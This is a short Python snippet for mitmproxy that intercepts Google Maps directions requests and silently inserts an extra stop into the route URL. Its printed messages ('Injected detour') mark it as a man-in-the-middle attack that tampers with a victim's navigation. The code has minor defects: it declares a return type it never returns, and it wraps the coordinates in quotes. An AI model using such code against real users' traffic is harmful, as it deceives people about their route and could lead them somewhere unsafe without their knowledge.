from mitmproxy.http import HTTPFlow


def _add_stop(flow: HTTPFlow, latitude: float, longitude: float) -> HTTPFlow:
    """Add a stop to the given Google Maps request."""
    url = flow.request.url
    if not url.startswith('https://www.google.com/maps/dir'):
        return
    print(f'[?] Request intercepted: {url}')
    url = url.split('/')
    for i, section in enumerate(url):
        if section.startswith('@'):
            break
    url.insert(i, f"'{latitude},{longitude}'")
    print(
        f'[+] Injected detour with latitude {latitude}, '
        f'longitude {longitude}'
    )
    flow.request.url = '/'.join(url)
    print(f'[?] New request string: {flow.request.url}')
